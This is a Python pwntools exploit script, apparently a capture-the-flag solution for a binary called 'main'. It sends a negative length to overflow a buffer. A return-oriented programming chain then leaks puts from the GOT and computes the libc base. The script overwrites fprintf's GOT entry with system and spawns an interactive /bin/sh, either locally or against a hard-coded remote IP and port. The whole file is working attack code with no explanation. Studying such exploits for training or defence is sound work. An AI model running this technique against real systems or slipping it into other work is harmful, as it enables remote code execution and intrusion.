#!/usr/bin/env python
from pwn import *
import sys

POPRDI = 0x0000000000400a93
POPRSIR15 = 0x0000000000400a91
ONE_GADGET = 0xe6b96
bss = 0x601100
LEAVE = 0x0000000000400a28
RET = 0x00000000004006e6

## LIBC GADGETS
POPRSI = 0x000000000002709c
POPRDXR12 = 0x000000000011c421

POPPER = 0x400A8A
CALLER = 0x400A70
INIT = 0x600e38

def exploit(p, elf, libc):
    # stage 1
    p.recvuntil("length:")
    p.sendline("-1")
    p.recvuntil("ID:")
    p.sendline("0")
    p.recvuntil("message:")
    payload = p64(0)*15
    payload += p64(POPRDI)
    payload += p64(elf.got["puts"])  # Leak puts@got
    payload += p64(elf.plt["puts"])

    # pop rdx
    RDX = 16
    payload += p64(POPPER)
    payload += p64(0) # rbx
    payload += p64(0) # rbp
    payload += p64(INIT) # r12
    payload += p64(0x0) * 2 # r13 - r14
    payload += p64(RDX) # r15 ->>> rdx
    payload += p64(CALLER)
    payload += p64(0x0) * 7

    # pop rdi
    payload += p64(POPRDI)
    payload += p64(0)

    # pop rsi
    payload += p64(POPRSIR15)
    payload += p64(elf.got['fprintf'])
    payload += p64(0xdeadbeef)

    # read
    payload += p64(elf.plt['read'])

    # system('/bin/sh)
    payload += p64(RET)
    payload += p64(POPRDI)
    payload += p64(elf.got["fprintf"] + 8)
    payload += p64(elf.plt["fprintf"])
    
    p.sendline(payload)
    p.recvuntil("Goodbye!\n")
    puts_libc = u64(p.recvn(6).ljust(8, "\x00"))
    log.success("puts @ "+hex(puts_libc))
    libc.address = puts_libc - libc.symbols["puts"]
    log.success("libc @ "+hex(libc.address))

    p.send(p64(libc.symbols['system']) + '/bin/sh\x00')

    p.interactive()

if __name__ == '__main__':
    pname = "./main"
    elf = ELF(pname)
    # You can add a libc binary if needed
    

    if len(sys.argv) > 1:
        if sys.argv[1][0] == "r":
            p = remote("54.225.38.91", 1027)
            libc = ELF("./libc6_2.30-0ubuntu2_amd64.so")
        else:
            p = process(pname)
            libc = elf.libc
            # If running with an specific libc use this:
            # p = process(pname, env={"LD_PRELOAD":"./libc.so"})
    else:
        p = process(pname)
        libc = elf.libc
        # If running with an specific libc use this:
        # p = process(pname, env={"LD_PRELOAD":"./libc.so"})

    # pause()   # This is for debugging with gdb!!! For attaching to process use: gdb -p `pidof challenge`
    exploit(p, elf, libc)
